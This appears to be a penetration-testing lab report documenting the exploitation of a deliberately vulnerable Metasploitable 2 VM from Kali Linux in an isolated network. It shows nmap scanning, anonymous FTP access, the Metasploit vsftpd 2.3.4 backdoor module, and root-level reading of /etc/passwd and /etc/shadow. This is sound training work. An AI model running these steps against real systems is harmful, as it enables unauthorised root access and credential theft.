# TP Penetration Testing — Kali Linux vs Metasploitable 2

## Lab Environment
- Attacker machine: Kali Linux — 10.0.2.15
- Target machine: Metasploitable 2 — 10.0.2.4
- Network: NAT Network (VirtualBox) — private isolated network
- Hypervisor: Oracle VirtualBox

---

## Step 1 — Environment Verification
### Objective
Confirm both VMs are running and can communicate before starting any scan.

### Commands used
- ip a → verify Kali IP address
- sudo arp-scan -l → discover all machines on the network
- ping -c 4 10.0.2.4 → confirm communication with target

### Results
- Kali IP: 10.0.2.15 (eth0 interface)
- Machines found on network: 10.0.2.1 (gateway), 10.0.2.2 (DNS), 10.0.2.3, 10.0.2.4
- Metasploitable identified at: 10.0.2.4
- Ping test: successful — target is reachable

---

## Step 2 — Reconnaissance & Scanning
### Objective
Discover all open ports and running services on the target machine.

### Network discovery
- Kali IP: 10.0.2.15
- Metasploitable IP: 10.0.2.4
- Tool used: arp-scan -l

### Command used
nmap -sV 10.0.2.4

### Port scan results
- 21/tcp   vsftpd 2.3.4       → VULNERABLE (CVE-2011-2523)
- 22/tcp   OpenSSH 4.7p1
- 23/tcp   Telnet (Linux telnetd)
- 25/tcp   SMTP (Postfix)
- 80/tcp   Apache 2.2.8
- 139/tcp  Samba
- 1524/tcp bindshell          → open root shell (critical)
- 3306/tcp MySQL 5.0.51a
- 5432/tcp PostgreSQL
- 5900/tcp VNC
- Total: 22 open ports

### Interpretation
Metasploitable has an abnormally large number of open ports.
A real production server should expose only the ports it needs.
The FTP service runs vsftpd 2.3.4 which contains a known backdoor.
Port 1524 exposes a root shell directly — no exploitation needed.
This confirms the machine is intentionally vulnerable.
FTP on port 21 will be our exploitation target.

---

## Step 3 — FTP Enumeration (Port 21)
### Objective
Analyze the FTP service in detail to identify misconfigurations and vulnerabilities.

### Command used
nmap --script ftp-anon,ftp-syst -p 21 10.0.2.4

### Findings
1. Anonymous FTP login: ALLOWED (code 230)
   - Anyone can connect without credentials
   - Severity: HIGH

2. FTP version: vsftpd 2.3.4
   - Known backdoor: CVE-2011-2523
   - Backdoor inserted into official source code in July 2011
   - Severity: CRITICAL

3. Connections are plain text (unencrypted)
   - Credentials and data visible on the network
   - Severity: MEDIUM

### Manual verification
- Command: ftp 10.0.2.4
- Username: anonymous
- Password: anything@test.com
- Result: 230 Login successful — anonymous access confirmed

---

## Step 4 — Exploitation
### Objective
Exploit the vsftpd 2.3.4 backdoor using Metasploit Framework.

### Tool: Metasploit Framework (msfconsole)
### Module: exploit/unix/ftp/vsftpd_234_backdoor
### CVE: CVE-2011-2523

### How the exploit works
Sending a username containing ':)' triggers the backdoor.
The FTP daemon opens a root shell on port 6200.
Metasploit connects to port 6200 and delivers the shell.
No password or credentials are needed at any point.

### Commands used
- search vsftpd
- use exploit/unix/ftp/vsftpd_234_backdoor
- show options
- set RHOSTS 10.0.2.4
- run

### Result
- Backdoor triggered successfully on port 6200
- Root shell obtained immediately — no credentials required
- Session opened: 10.0.2.15:46565 -> 10.0.2.4:6200
- Confirmed: uid=0(root) gid=0(root)

---

## Step 5 — Post-Exploitation
### Objective
Explore the compromised system to evaluate the extent of access.

### System information
- OS: Linux metasploitable 2.6.24-16-server (kernel from 2008)
- Hostname: metasploitable
- Current user: root (uid=0, gid=0)
- Network interface: eth0 — 10.0.2.4

### Commands run and findings
1. whoami → root
2. id → uid=0(root) gid=0(root)
3. hostname → metasploitable
4. uname -a → Linux 2.6.24 kernel (2008) — outdated, many known CVEs

5. cat /etc/passwd → 30+ accounts listed
   Real users identified: msfadmin, user, service, postgres
   Severity: MEDIUM

6. cat /etc/shadow → password hashes exposed (root-only file)
   Accounts with crackable hashes: root, msfadmin, user, service
   Severity: CRITICAL — hashes could be cracked offline with hashcat

7. ls /home → ftp, msfadmin, service, user
   All home directories accessible as root

8. ifconfig → confirmed target IP 10.0.2.4 on eth0

### Summary
Full root access obtained with no credentials.
All files, passwords, and configurations are readable.
The system is completely compromised.
